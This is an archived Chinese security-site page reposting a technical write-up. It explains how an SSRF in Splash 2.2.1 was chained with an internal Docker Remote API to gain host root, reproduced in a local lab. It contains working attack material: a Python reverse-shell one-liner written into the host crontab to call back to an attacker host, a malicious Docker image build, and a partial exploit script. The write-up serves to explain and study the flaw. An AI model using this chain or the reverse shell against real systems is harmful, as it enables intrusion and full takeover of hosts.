<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】Splash SSRF到获取内网服务器ROOT权限 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="Splash SSRF,渗透测试"/>
    
        <meta name="description" content="最近自己写的小工具在扫描的过程，发现了某公司在公网开放了一个使用开源系统的站点，该系统为 Splash，Splash 可以根据用户提供的url来渲染页面，并且url没有验证，因此可导致SSRF (带回显)。这次漏洞利用支持 POST 请求，结合内网 Docker Remote API，获取到了宿主机的root权限，最终导致内网漫游。文章整理了一下利用过程，如果有哪里写的不对或者不准确的地方，欢迎大家指出～"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】Splash SSRF到获取内网服务器ROOT权限</h2>
                <div class="article-msg">
                    <span class="time">2017-07-17 15:50:43</span>
                                        <span class="read">阅读：13796次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_4113"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="4113" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://xianzhi.aliyun.com/forum/read/1872.html"
                             target="_blank">来源： b1ngz@先知安全技术社区</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong><img src="http://p9.qhimg.com/t011465a4482950f794.jpg" title="t011465a4482950f794.jpg" alt="http://p9.qhimg.com/t011465a4482950f794.jpg"/></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong>0x 01 简介</strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">最近自己写的小工具在扫描的过程，发现了某公司在公网开放了一个使用开源系统的站点，该系统为 Splash，是一个使用 Python3、Twisted 和 QT5写的 javascript rendering service，即提供了HTTP API 的轻量级浏览器，默认监听在 &nbsp;8050 (http) 和 5023 (telnet) 端口。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Splash 可以根据用户提供的url来渲染页面，并且url没有验证，因此可导致SSRF (带回显)。和一般的 SSRF 不同的是，除了 GET 请求之外，Splash还支持 POST。这次漏洞利用支持 POST 请求，结合内网 Docker Remote API，获取到了宿主机的root权限，最终导致内网漫游。文章整理了一下利用过程，如果有哪里写的不对或者不准确的地方，欢迎大家指出～</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x 02 环境搭建</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为了不涉及公司的内网信息，这里在本地搭建环境，模拟整个过程</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">画了一个简单的图来描述环境</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01c723c3a2a16dd035.png" title="t0102b75d44897b1f37.png" alt="http://p8.qhimg.com/t0102b75d44897b1f37.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里使用 Virtualbox 运行 Ubuntu 虚拟机作为 Victim，宿主机作为 Attacker</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Attacker IP: 192.168.1.213</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Victim:</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">IP: 192.168.1.120 &nbsp;使用桥接模式</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内网IP：172.16.10.74，使用 Host-only 并且在 Adanced 中去掉 Cable Connected</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Splash开放在 http://192.168.1.120:8050 ，版本为 v2.2.1，Attacker可访问</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Docker remote api在 http://172.16.10.74:2375，版本为 17.06.0-ce，Attacker无法访问</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">JIRA 运行在 http://172.16.10.74:8080，Attacker无法访问</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Victim 机器上需要装 docker，安装步骤可以参考 文档</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因为后面测试需要利用 /etc/crontab 反弹，所以需要启动 cron</span></p><pre class="brush:plain;toolbar:false">service&nbsp;cron&nbsp;start</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">docker默认安装不会开放 tcp 2375 端口，这里需要修改一下配置，让其监听在 172.16.10.74 的 2375 端口</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在 /etc/default/docker 文件中添加</span></p><pre class="brush:plain;toolbar:false">DOCKER_OPTS=&quot;-H&nbsp;tcp://172.16.10.74:2375</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">创建目录 docker.service.d (如果没有的话)</span></p><pre class="brush:plain;toolbar:false">mkdir&nbsp;/etc/systemd/system/docker.service.d/</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">修改 vim /etc/systemd/system/docker.service.d/docker.conf 的内容为</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">[Service]
ExecStart=
EnvironmentFile=/etc/default/docker
ExecStart=/usr/bin/dockerd&nbsp;-H&nbsp;fd://&nbsp;$DOCKER_OPTS</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">重启 docker</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">systemctl&nbsp;daemon-reload
service&nbsp;docker&nbsp;restart</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">查看是否成功监听</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">root@test:/home/user#&nbsp;netstat&nbsp;-antp&nbsp;|&nbsp;grep&nbsp;LISTEN
tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;172.16.10.74:2375&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1531/dockerd&nbsp;&nbsp;&nbsp;
root@test:/home/user#&nbsp;curl&nbsp;172.16.10.74:2375
{&quot;message&quot;:&quot;page&nbsp;not&nbsp;found&quot;}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行 splash</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">docker&nbsp;pull&nbsp;scrapinghub/splash:2.2.1
sudo&nbsp;docker&nbsp;run&nbsp;--name=splash&nbsp;-d&nbsp;-p&nbsp;5023:5023&nbsp;-p&nbsp;8050:8050&nbsp;-p&nbsp;8051:8051&nbsp;scrapinghub/splash:2.2.1</pre><p style="text-align: center;"><img src="http://p0.qhimg.com/t014c0a7a94c3d663af.png" title="t010a07152978deeef6.png" alt="http://p7.qhimg.com/t010a07152978deeef6.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行 JIRA</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">docker&nbsp;pull&nbsp;cptactionhank/atlassian-jira:latest
docker&nbsp;run&nbsp;-d&nbsp;-p&nbsp;172.16.10.74:8080:8080&nbsp;--name=jira&nbsp;cptactionhank/atlassian-jira:latest</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以测试一下，宿主机上无法访问以下两个地址的</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;docker&nbsp;remote&nbsp;api
http://192.168.1.120:2375/
#&nbsp;jira
http://192.168.1.120:8080/</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x 03 利用过程</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">带回显SSRF</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先来看一下 SSRF</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在宿主机上访问 http://192.168.1.120:8050/ ，右上角有一个填写url的地方，这里存在带回显的ssrf</span></p><p style="text-align: center;"><img src="http://p4.qhimg.com/t011dd7c104da00fa8a.png" title="t01efe806d015251a07.png" alt="http://p9.qhimg.com/t01efe806d015251a07.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里填写内网jira的地址 http://172.16.10.74:8080，点击 Render me!，可以看到返回了页面截图、请求信息和页面源码，相当于是一个内网浏览器!</span></p><p style="text-align: center;"><img src="http://p7.qhimg.com/t0128ed3462ed7d32a7.png" title="t015dad25b636db99c8.png" alt="http://p0.qhimg.com/t015dad25b636db99c8.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">查看 文档 得知，有个 render.html &nbsp;也可以渲染页面，这里访问 docker remote api，http://172.16.10.74:2375</span></p><p style="text-indent: 0em; text-align: center;"><img src="http://p7.qhimg.com/t01a895273550e57959.png" title="t011481eeb2c47574c2.png" alt="http://p6.qhimg.com/t011481eeb2c47574c2.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Lua scripts尝试</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">阅读了下文档，得知 splash 支持执行自定义的 Lua scripts，也就是首页填写url下面的部分</span></p><p style="text-align: center;"><img src="http://p6.qhimg.com/t01e7b7ca9c02ba3be6.png" title="t01fb366c060ff49da2.png" alt="http://p4.qhimg.com/t01fb366c060ff49da2.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">具体可以参考这里 Splash Scripts Tutorial</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是这里的 Lua 默认是运行在 Sandbox 里，很多标准的 Lua modules 和 functions 都被禁止了</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">文档 <a href="http://splash.readthedocs.io/en/2.2.1/scripting-libs.html#standard-library">http://splash.readthedocs.io/en/2.2.1/scripting-libs.html#standard-library</a>&nbsp;列出了 Sandbox 开启后(默认开启)可用的 Lua modules：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">string
table
math
os</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里有一个os，可以执行系统命令 <a href="http://www.lua.org/manual/5.2/manual.html#pdf-os.execute">http://www.lua.org/manual/5.2/manual.html#pdf-os.execute</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是试了一下 require os，返回 not found，所以没办法实现</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">local&nbsp;os&nbsp;=&nbsp;require(&quot;os&quot;)
function&nbsp;main(splash)
end</pre><p style="text-align: center;"><img src="http://p6.qhimg.com/t014fd1bdf6b8c153c4.png" title="t017bca2c294a53569a.png" alt="http://p8.qhimg.com/t017bca2c294a53569a.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过docker remote api 获取宿主机root权限</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">再看了遍文档，发现除了 GET 请求，还支持 POST，具体可以参考这里 <a href="http://splash.readthedocs.io/en/2.2.1/api.html#render-html">http://splash.readthedocs.io/en/2.2.1/api.html#render-html</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过之前对该公司的测试，得知某些ip段运行着docker remote api，所以就想尝试利用post请求，调用api，通过挂载宿主机 /etc 目录 ，创建容器，然后写 crontab 来反弹shell，获取宿主机root权限。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">根据docker remote api 的 文档 ，实现反弹需要调用几个 API，分别是</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">POST /images/create ：创建image，因为当时的环境可以访问公网，所以就选择将创建好的 image 先push到docker hub，然后调用 API 拉取</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">POST /containers/create: 创建 container，这里需要挂载宿主机 /etc 目录</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">POST /containers/(id or name)/start : 启动container，执行将反弹定时任务写入宿主机的 /etc/crontab</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要说一下构建 image，这里使用了 python 反弹shell 的方法，代码文件如下</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">Dockerfile
FROM&nbsp;busybox:latest
ADD&nbsp;./start.sh&nbsp;/start.sh
WORKDIR&nbsp;/</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">start.sh：container启动时运行的脚本，负责写入宿主机 /etc/crontab ，第一个参数作为反弹host，第二个参数为端口</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#!/bin/sh
echo&nbsp;&quot;*&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;python&nbsp;-c&nbsp;&#39;import&nbsp;socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;$1\&quot;,&nbsp;$2));os.dup2(s.fileno(),0);&nbsp;os.dup2(s.fileno(),1);&nbsp;os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;&nbsp;&gt;&gt;&nbsp;/hostdir/crontab</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">构建并push</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">docker&nbsp;build&nbsp;-t&nbsp;b1ngz/busybox:latest&nbsp;.
docker&nbsp;push&nbsp;b1ngz/busybox:latest</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">虽然 splash 支持 post 请求，但是比较坑的是，文档里没有给向目标地址发 POST 请求的例子，只有参数说明，看了遍文档，关键参数有这几个</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">url : 请求url</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">http_method：请求url的方法</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">headers: 请求 headers</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">body: 请求url的body，默认为 application/x-www-form-urlencoded</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">测试的时候，一开始一直使用 get 方法来请求 render.html 接口，但总是返回400 ，卡了很久</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">{
&nbsp;&nbsp;&nbsp;&nbsp;error:&nbsp;400,
&nbsp;&nbsp;&nbsp;&nbsp;description:&nbsp;&quot;Incorrect&nbsp;HTTP&nbsp;API&nbsp;arguments&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;type:&nbsp;&quot;BadOption&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;info:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;argument:&nbsp;&quot;headers&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;description:&nbsp;&quot;&#39;headers&#39;&nbsp;must&nbsp;be&nbsp;either&nbsp;a&nbsp;JSON&nbsp;array&nbsp;of&nbsp;(name,&nbsp;value)&nbsp;pairs&nbsp;or&nbsp;a&nbsp;JSON&nbsp;object&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type:&nbsp;&quot;bad_argument&quot;
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">搜了一下，在 github issue 里找到了原因，得用post请求，并且 headers 得在 body里，且类型为 json，略坑，这里给出利用脚本，代码有注释，大家可以自己看看</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:php;toolbar:false">#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-
__author__&nbsp;=&nbsp;&#39;b1ngz&#39;
import&nbsp;json
import&nbsp;re
import&nbsp;requests
def&nbsp;pull_image(api,&nbsp;docker_api,&nbsp;image_name,&nbsp;image_tag):
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;pull&nbsp;image:&nbsp;%s:%s&quot;&nbsp;%&nbsp;(image_name,&nbsp;image_tag))
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;%s/render.html&quot;&nbsp;%&nbsp;api
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;url:&nbsp;%s&quot;&nbsp;%&nbsp;url)
&nbsp;&nbsp;&nbsp;&nbsp;docker_url&nbsp;=&nbsp;&#39;%s/images/create?fromImage=%s&amp;tag=%s&#39;&nbsp;%&nbsp;(docker_api,&nbsp;image_name,&nbsp;image_tag)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;docker_url:&nbsp;%s&quot;&nbsp;%&nbsp;docker_url)
&nbsp;&nbsp;&nbsp;&nbsp;params&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;url&#39;:&nbsp;docker_url,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;http_method&#39;:&nbsp;&#39;POST&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;body&#39;:&nbsp;&#39;&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;timeout&#39;:&nbsp;60
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;resp&nbsp;=&nbsp;requests.get(url,&nbsp;params=params)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;request&nbsp;url:&nbsp;%s&quot;&nbsp;%&nbsp;resp.request.url)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;status&nbsp;code:&nbsp;%d&quot;&nbsp;%&nbsp;resp.status_code)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;resp&nbsp;text:&nbsp;%s&quot;&nbsp;%&nbsp;resp.text)
&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;-&quot;&nbsp;*&nbsp;50)
